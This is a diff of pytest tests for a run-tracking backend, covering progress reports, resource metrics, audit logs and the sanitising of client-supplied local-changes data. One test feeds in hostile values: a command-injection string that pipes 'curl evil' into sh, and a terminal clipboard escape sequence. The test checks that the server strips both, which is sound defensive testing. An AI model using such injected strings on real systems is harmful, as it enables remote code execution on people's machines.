@@ -26,7 +26,7 @@ def outputs_api(monkeypatch):
   output = SimpleNamespace(data={}, deleted=False, is_failed=True, is_pending=False, is_running=False, metrics={"psnr": 30})
   output.to_dict = lambda: {"is_failed": output.is_failed, "is_pending": output.is_pending, "is_running": output.is_running}
   # Output.set_status, without the dates (integration_tests/test_activity.py tests them)
-  output.set_status = lambda is_pending, is_running: output.__dict__.update(is_pending=bool(is_pending or is_running), is_running=bool(is_running))
+  output.set_status = lambda is_pending, is_running, **kwargs: output.__dict__.update(is_pending=bool(is_pending or is_running), is_running=bool(is_running))
   module.Output.get_or_create.return_value = output
   module.test_output = output
   return module
@@ -46,7 +46,10 @@ def post(outputs_api, dummy_app, without=(), **data):
 
 
 def notify(outputs_api, dummy_app, **data):
-  return post(outputs_api, dummy_app, **data).get_json()
+  """The run, as the server answers it (without what it says about its settings)"""
+  answer = post(outputs_api, dummy_app, **data).get_json()
+  answer.pop('local_changes_level', None)
+  return answer
 
 
 @pytest.mark.parametrize("status", [{"is_pending": True}, {"is_pending": True, "is_running": True}])
@@ -91,17 +94,23 @@ def test_clients_cannot_mark_runs_as_replaceable(outputs_api, dummy_app):
   assert outputs_api.test_output.data["storage"] == "nfs"
 
 
-def test_the_web_app_cannot_change_what_only_the_server_sets(outputs_api, dummy_app):
+def test_the_web_app_cannot_change_what_only_the_server_sets(outputs_api, dummy_app, monkeypatch):
   from flask import g
   import backend.api.auth as auth
   auth.is_authorized_user.return_value = True
-  output = SimpleNamespace(data={"submitted_by": {"user_name": "alice"}}, metrics={}, batch=MagicMock(), to_dict=lambda: {})
+  output = SimpleNamespace(id=7, data={"submitted_by": {"user_name": "alice"}}, metrics={}, batch=MagicMock(), to_dict=lambda: {},
+                           is_failed=False, is_pending=False, is_running=False, test_input=None, configurations=[], platform=None, extra_parameters={})
   outputs_api.Output.query.filter.return_value.one.return_value = output
+  audit = MagicMock()
+  monkeypatch.setattr(outputs_api, "audit", audit)
   data = {"submitted_by": {"user_name": "mallory"}, "optimization_best": "default|iter1", "notes": "ok"}
   with dummy_app.test_request_context("/api/v1/output/7/", method="PUT", json={"data": data}):
     g.user = {"user_name": "mallory"}
     outputs_api.update_output(7)
   assert output.data == {"submitted_by": {"user_name": "alice"}, "notes": "ok"}
+  # the audit log says what changed, only that
+  assert audit.call_args.args[:2] == ('run.update', 'run')
+  assert audit.call_args.kwargs["changes"] == {"data": {"notes": {"from": None, "to": "ok"}}}
 
 
 def test_metrics_definitions_are_saved(outputs_api, dummy_app, monkeypatch):
@@ -158,6 +167,7 @@ def added_metrics_env(outputs_api, monkeypatch):
   output.batch.ci_commit.project.data = {"qatools_config": {"project": {"reference_branch": "main"}}}
   output.to_dict = lambda: {"metrics": output.metrics, "data": output.data}
   outputs_api.Output.query.filter.return_value.with_for_update.return_value.one.return_value = output
+  outputs_api.Output.query.filter.return_value.one.return_value = output
   return output
 
 
@@ -325,6 +335,28 @@ def test_a_run_done_again_in_place_keeps_a_trace_too(outputs_api, dummy_app):
   assert output.data["previous_attempts"][1]["metrics"]["psnr"] == 32
 
 
+def test_earlier_attempts_keep_the_peaks_of_what_they_used():
+  """e.g. an attempt killed because it used too much memory: the next one shows its own"""
+  from backend.attempts import record_attempt
+  resources = {"version": 1, "updated_at": "2026-11-20T10:00:00Z", "host": {"name": "node-12", "cpus": 64},
+               "memory": {"peak_mb": 4000.0, "mean_mb": 2000.0, "max_process_mb": 4090.5, "cgroup_peak_mb": 4096.0, "cgroup_limit_mb": 4096.0},
+               "cpu": {"mean_cores": 1.0}, "gpus": [{"index": 0, "memory_peak_mb": 30000.0, "run_memory_peak_mb": 12000.0}, {"index": 1, "memory_peak_mb": 8000.0}]}
+  output = SimpleNamespace(id=7, data={"resources": resources}, output_dir_override="/storage/output", is_pending=True, is_failed=False)
+  record_attempt(output, "/storage/output_attempt2", is_pending=True)
+  assert "resources" not in output.data
+  assert output.data["previous_attempts"][0]["resources"] == {
+    "peak_mb": 4000.0, "max_process_mb": 4090.5, "cgroup_peak_mb": 4096.0, "cgroup_limit_mb": 4096.0,
+    "gpu_memory_peak_mb": 12000.0, "updated_at": "2026-11-20T10:00:00Z", "host": "node-12"}
+  # nothing to keep
+  output.data["resources"] = {"version": 1, "memory": "?"}
+  record_attempt(output, "/storage/output_attempt3", is_pending=True)
+  assert "resources" not in output.data["previous_attempts"][1]
+  output.data["resources"] = ["not", "an", "object"]
+  output.output_dir_override = "/storage/output_attempt3"
+  record_attempt(output, "/storage/output_attempt4", is_pending=True)
+  assert "resources" not in output.data["previous_attempts"][2]
+
+
 def test_only_the_last_attempts_are_remembered():
   from backend.attempts import record_attempt, MAX_PREVIOUS_ATTEMPTS
   output = SimpleNamespace(id=7, data={}, output_dir_override="/storage/output", is_pending=False, is_failed=False)
@@ -363,3 +395,233 @@ def test_hard_deletes_remove_the_folder_that_says_where_the_latest_attempt_is(tm
   (first / "left.txt").write_text("")
   forget_attempts(latest)
   assert first.exists() and removed_parents == [first]
+
+
+# ---------------------------------------------------------------- what running runs report (qaboard.start_run() in the SDK)
+
+@pytest.fixture
+def running_run(outputs_api, added_metrics_env, monkeypatch):
+  """A run started from code, that logs while it runs"""
+  output = added_metrics_env
+  output.is_pending, output.is_running, output.metrics = True, True, {}
+  monkeypatch.setattr(outputs_api, "current_data", lambda output: output.data)
+  return output
+
+
+def report_progress(outputs_api, dummy_app, body):
+  with dummy_app.test_request_context("/api/v1/output/7/progress", method="PATCH", json=body):
+    return outputs_api.report_output_progress(7)
+
+
+def test_running_runs_report_their_metrics_and_params(outputs_api, dummy_app, running_run):
+  import backend.api.auth as auth
+  output = running_run
+  report_progress(outputs_api, dummy_app, {"metrics": {"train/loss": 0.9, "val/loss": 1.2}, "params": {"optimizer": "adamw"},
+                                           "metrics_definitions": {"val/loss": {"smaller_is_better": True}, "other": {"suffix": "%"}}})
+  assert output.metrics == {"train/loss": 0.9, "val/loss": 1.2}
+  assert output.data["params"] == {"optimizer": "adamw"}
+  assert (output.is_pending, output.is_running) == (True, True)
+  # the same access as the results `qa` sends, not a token whatever the server's policy
+  assert auth.ingest_access.call_args.kwargs == {}
+  saved = outputs_api.save_metrics_definitions.call_args.args[2]
+  assert saved["metrics_definitions"] == {"val/loss": {"smaller_is_better": True}}
+  # each report replaces the previous one: the run says everything each time
+  response = report_progress(outputs_api, dummy_app, {"metrics": {"train/loss": 0.5}})
+  assert output.metrics == {"train/loss": 0.5} and output.data["params"] == {"optimizer": "adamw"}
+  assert response.get_json()["metrics"] == {"train/loss": 0.5}
+  assert outputs_api.save_metrics_definitions.call_count == 1
+
+
+def test_running_runs_say_what_they_use_of_their_machine(outputs_api, dummy_app, running_run):
+  """qaboard/system_metrics.py: with each heartbeat, so that a run its scheduler kills said what it used until then"""
+  output = running_run
+  output.metrics = {"loss": 0.5}
+  resources = {"version": 1, "memory": {"peak_mb": 4096.0}, "gpus": [{"index": 0, "memory_peak_mb": 20000.0}]}
+  # a heartbeat: no metrics, nothing else changes
+  report_progress(outputs_api, dummy_app, {"resources": resources})
+  assert output.data["resources"] == resources and output.metrics == {"loss": 0.5}
+  # the latest one
+  report_progress(outputs_api, dummy_app, {"metrics": {"loss": 0.4}, "resources": {"version": 1, "memory": {"peak_mb": 5000.0}}})
+  assert output.data["resources"]["memory"] == {"peak_mb": 5000.0} and output.metrics == {"loss": 0.4}
+  # reports that don't say keep it
+  report_progress(outputs_api, dummy_app, {})
+  assert output.data["resources"]["memory"] == {"peak_mb": 5000.0}
+  # an odd one is ignored, not refused: a refused heartbeat would fail the run once it's silent
+  for odd in ([1], {"x": "y" * 20_000}):
+    response = report_progress(outputs_api, dummy_app, {"metrics": {"loss": 0.3}, "resources": odd})
+    assert response.status_code == 200 and output.metrics == {"loss": 0.3}
+    assert output.data["resources"]["memory"] == {"peak_mb": 5000.0}
+
+
+def test_the_end_of_a_run_says_what_it_used(outputs_api, dummy_app):
+  """POST /api/v1/output/ keeps data.resources, if it looks like one: it's sent with every run of a batch"""
+  output = outputs_api.test_output
+  notify(outputs_api, dummy_app, is_pending=False, metrics={}, data={"resources": {"version": 1, "memory": {"peak_mb": 10.0}}})
+  assert output.data["resources"] == {"version": 1, "memory": {"peak_mb": 10.0}}
+  notify(outputs_api, dummy_app, is_pending=False, metrics={}, data={"resources": {"x": "y" * 20_000}, "storage": 5})
+  assert output.data["resources"] == {"version": 1, "memory": {"peak_mb": 10.0}} and output.data["storage"] == 5
+
+
+def test_an_older_qa_lists_the_earlier_attempts_logs_without_their_runners(outputs_api, dummy_app):
+  """What a newer `qa` listed is stale: the web app reads attempt_logs"""
+  output = outputs_api.test_output
+  notify(outputs_api, dummy_app, is_pending=False, metrics={}, data={"attempt_logs": [1], "attempt_log_files": ["log.attempt1.txt", "log.attempt1.lsf.txt"]})
+  assert output.data["attempt_log_files"] == ["log.attempt1.txt", "log.attempt1.lsf.txt"]
+  notify(outputs_api, dummy_app, is_pending=False, metrics={}, data={"attempt_logs": [1, 2]})
+  assert output.data["attempt_logs"] == [1, 2] and "attempt_log_files" not in output.data
+
+
+def test_a_run_started_without_a_collection_forgets_the_one_of_before(outputs_api, dummy_app):
+  """qa sends nulls when it starts a run of a plain input (qaboard/payloads.py): redone, it isn't a collection's run anymore"""
+  output = outputs_api.test_output
+  notify(outputs_api, dummy_app, is_pending=False, metrics={}, data={"collection": "night@2", "collection_version": 2, "collection_id": 7})
+  assert (output.data["collection"], output.data["collection_version"], output.data["collection_id"]) == ("night@2", 2, 7)
+  # what doesn't say (qa sync, an older qa) keeps it
+  notify(outputs_api, dummy_app, is_pending=False, metrics={}, data={"storage": 5})
+  assert output.data["collection"] == "night@2"
+  notify(outputs_api, dummy_app, is_pending=False, metrics={}, data={"collection": None, "collection_version": None, "collection_id": None})
+  assert not {"collection", "collection_version", "collection_id"} & set(output.data)
+
+
+def test_progress_keeps_the_metrics_scripts_added(outputs_api, dummy_app, running_run):
+  output = running_run
+  output.data["added_metrics"] = {"sharpness": {"value": 0.4, "at": "2026-11-02T10:00:00+00:00"}, "loss": {"value": 3, "at": "2026-11-02T10:00:00+00:00"}}
+  report_progress(outputs_api, dummy_app, {"metrics": {"loss": 0.5}})
+  assert output.metrics == {"sharpness": 0.4, "loss": 0.5}
+  assert set(output.data["added_metrics"]) == {"sharpness"}
+
+
+def test_only_running_runs_report_progress(outputs_api, dummy_app, running_run):
+  output = running_run
+  output.is_pending, output.is_running, output.metrics = False, False, {"psnr": 30}
+  response, status = report_progress(outputs_api, dummy_app, {"metrics": {"loss": 0.5}})
+  assert status == 409 and response.get_json()["reason"] == "not_running"
+  # queued, not started
+  output.is_pending = True
+  _, status = report_progress(outputs_api, dummy_app, {"metrics": {"loss": 0.5}})
+  assert status == 409 and output.metrics == {"psnr": 30}
+
+
+@pytest.mark.parametrize("body, message", [
+  ({"metrics": {"is_failed": True}}, "only the run itself sets is_failed"),
+  ({"metrics": {"x": float("nan")}}, "not a finite number"),
+  ({"metrics": [1]}, "`metrics` must be an object"),
+  ({"metrics": {f"m{i}": i for i in range(2001)}}, "at most 2000"),
+  ({"metrics": {}, "params": ["adamw"]}, "`params` must be an object"),
+  ({"metrics": {}, "params": {"x": "y" * 100_000}}, "`params` must be an object"),
+])
+def test_progress_is_checked(outputs_api, dummy_app, running_run, body, message):
+  response, status = report_progress(outputs_api, dummy_app, body)
+  assert status == 400 and message in response.get_json()["error"]
+  assert running_run.metrics == {}
+
+
+def test_progress_needs_access_to_the_project(outputs_api, dummy_app, running_run, monkeypatch):
+  import backend.api.auth as auth
+  monkeypatch.setattr(auth.ingest_access, "return_value", (None, (dummy_app.response_class('{"error": "token"}', status=403, content_type='application/json'), 403)))
+  _, status = report_progress(outputs_api, dummy_app, {"metrics": {"x": 1}})
+  assert status == 403 and running_run.metrics == {}
+  monkeypatch.setattr(auth.ingest_access, "return_value", (ALICE, None))
+  monkeypatch.setattr(auth.is_authorized_user, "return_value", False)
+  _, status = report_progress(outputs_api, dummy_app, {"metrics": {"x": 1}})
+  assert status == 403
+  # refused callers take no lock on the run
+  outputs_api.Output.query.filter.return_value.with_for_update.assert_not_called()
+  outputs_api.Output.query.filter.return_value.one.side_effect = outputs_api.NoResultFound
+  _, status = report_progress(outputs_api, dummy_app, {"metrics": {"x": 1}})
+  assert status == 404
+
+
+def test_runs_record_which_projects_used_their_input(outputs_api, dummy_app, monkeypatch):
+  # for the project's Inputs tab (backend/input_catalog.py): new runs count, updates of a run don't
+  record = MagicMock(return_value=True)
+  monkeypatch.setattr(outputs_api, "record_run_in_savepoint", record)
+  outputs_api.TestInput.get_or_create.return_value.id = 12
+  outputs_api.CiCommit.get_or_create.return_value.project_id = "group/project"
+  commits = outputs_api.db_session.commit.call_count
+  notify(outputs_api, dummy_app, is_pending=True)
+  assert record.call_args.args == (outputs_api.db_session, 12, "group/project") and record.call_args.kwargs == {"new_output": True}
+  # saved with the run: one commit
+  assert outputs_api.db_session.commit.call_count == commits + 1
+  # the updates of the run (running, done): no UPDATE
+  outputs_api.test_output.id = 7
+  notify(outputs_api, dummy_app, is_pending=False)
+  assert record.call_count == 1
+
+
+def test_runs_are_saved_even_if_their_input_cannot_be_recorded(outputs_api, dummy_app, monkeypatch):
+  # e.g. before the migration that adds input_projects: the savepoint is undone, not the run
+  from backend import input_catalog
+  monkeypatch.setattr(input_catalog, "record_run", MagicMock(side_effect=RuntimeError("relation input_projects does not exist")))
+  session = outputs_api.db_session
+  rollbacks, commits, savepoints = session.rollback.call_count, session.commit.call_count, session.begin_nested.call_count
+  response = post(outputs_api, dummy_app, is_pending=False, metrics={"psnr": 30})
+  assert response.status_code == 200 and response.get_json()["is_failed"] is False
+  assert session.begin_nested.call_count == savepoints + 1
+  # the savepoint's context manager rolled it back: the run's transaction goes on, and is committed once
+  assert session.begin_nested.return_value.__exit__.call_args.args[0] is RuntimeError
+  assert (session.rollback.call_count, session.commit.call_count) == (rollbacks, commits + 1)
+
+
+def test_record_run_in_savepoint():
+  from backend import input_catalog
+  session = MagicMock()
+  calls = []
+  session.flush.side_effect = lambda: calls.append('flush')
+  session.begin_nested.side_effect = lambda: calls.append('savepoint') or MagicMock()
+  with pytest.MonkeyPatch.context() as m:
+    m.setattr(input_catalog, "record_run", lambda *args, **kwargs: calls.append(('record', args, kwargs)))
+    assert input_catalog.record_run_in_savepoint(session, 3, "p", new_output=True) is True
+  # flushed outside the savepoint: the run's own errors stay the caller's
+  assert calls == ['flush', 'savepoint', ('record', (3, "p"), {"new_output": True, "now": None})]
+  session.flush.side_effect = RuntimeError("the run can't be saved")
+  with pytest.raises(RuntimeError):
+    input_catalog.record_run_in_savepoint(session, 3, "p")
+
+
+LOCAL_CHANGES = {
+  "level": "patch", "dirty": True, "head": "0" * 40, "files": [{"path": "a.py", "status": "M", "added": 1, "deleted": 0}],
+  "files_total": 1, "added": 1, "deleted": 0, "sha256": "f" * 64, "patch": {"path": ".qaboard/local-changes.patch", "bytes": 10},
+}
+
+
+@pytest.mark.parametrize("level, expected", [
+  ("patch", LOCAL_CHANGES),
+  ("summary", {**{k: v for k, v in LOCAL_CHANGES.items() if k != "patch"}, "level": "summary", "patch": {"bytes": 10, "omitted": "level"}}),
+  ("off", None),
+])
+def test_runs_record_as_much_of_their_local_changes_as_allowed(outputs_api, dummy_app, monkeypatch, level, expected):
+  from backend import local_changes
+  monkeypatch.setattr(local_changes, "setting", lambda key: level if key == "runs.local_changes" else None)
+  answer = post(outputs_api, dummy_app, data={"local_changes": LOCAL_CHANGES, "dirty": True}).get_json()
+  # runs that write in a shared storage don't write patches the server doesn't want
+  assert answer["local_changes_level"] == level
+  assert outputs_api.test_output.data.get("local_changes") == expected
+  assert outputs_api.test_output.data.get("dirty") is (None if level == "off" else True)
+
+
+def test_local_changes_are_kept_as_the_web_app_expects_them(outputs_api, dummy_app):
+  hostile = {**LOCAL_CHANGES, "files": [{"path": "x" * 10_000, "added": "1", "status": "Mxx"}, "a.py", {"path": 3}] + [{"path": "b"}] * 600,
+             "excluded": "nope", "code": "print('hi')", "dirty": "yes", "branch": ["main"], "head": "x; curl evil | sh #", "base": "a" * 40,
+             "error": "\x1b]52;c;ZXZpbA==\x07bad"}
+  post(outputs_api, dummy_app, data={"local_changes": hostile, "dirty": "yes"})
+  kept = outputs_api.test_output.data["local_changes"]
+  assert len(kept["files"]) == 498 and kept["files"][0] == {"path": "x" * 4096, "status": "Mx", "added": None, "deleted": None}
+  assert "code" not in kept and "excluded" not in kept and "branch" not in kept
+  # commits are shas: people copy commands made of them
+  assert "head" not in kept and kept["base"] == "a" * 40
+  assert kept["error"] == "]52;c;ZXZpbA==bad"
+  assert kept["dirty"] is None and outputs_api.test_output.data["dirty"] is None
+
+
+def test_unpushed_commits_are_listed_by_sha_and_subject(outputs_api, dummy_app):
+  log = [{"sha": "c" * 40, "subject": "Tune the filter"}, {"sha": "HEAD", "subject": "x"}, "nope"]
+  post(outputs_api, dummy_app, data={"local_changes": {**LOCAL_CHANGES, "unpushed_log": log}})
+  assert outputs_api.test_output.data["local_changes"]["unpushed_log"] == [{"sha": "c" * 40, "subject": "Tune the filter"}]
+
+
+def test_clients_cant_say_their_patch_is_allowed(outputs_api, dummy_app, monkeypatch):
+  from backend import local_changes
+  monkeypatch.setattr(local_changes, "setting", lambda key: "summary" if key == "runs.local_changes" else None)
+  post(outputs_api, dummy_app, data={"local_changes": {**LOCAL_CHANGES, "level": "off"}})
+  assert outputs_api.test_output.data["local_changes"]["patch"] == {"bytes": 10, "omitted": "level"}
